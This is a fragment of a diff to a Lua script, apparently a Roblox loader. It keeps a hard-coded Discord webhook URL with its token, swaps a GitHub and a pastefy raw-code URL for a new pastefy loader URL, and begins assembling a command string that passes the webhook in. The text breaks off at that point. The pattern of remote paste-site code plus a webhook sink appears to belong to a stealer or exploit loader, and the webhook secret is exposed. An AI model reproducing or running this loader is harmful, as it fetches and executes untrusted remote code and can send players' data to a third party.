@@ -1,6 +1,5 @@
 local userWebhook = "https://discordapp.com/api/webhooks/1381247952672260156/2hGAvs2idEF1QMjM0tQxrSsYSTKIrk-nL5NSO6Echm1Tv5iyUjBEfHyqIgOzuAopXTmo"
-local mainScriptUrl = "https://raw.githubusercontent.com/DupeEsp/Loader/refs/heads/main/main"
-local loaderUrl = "https://pastefy.app/UCpQmR3q/raw"
+local loaderUrl = "https://pastefy.app/DCXBQIaD/raw"
 
 local commandToRun = 
     "Webhook = '" .. userWebhook .. "'; " ..
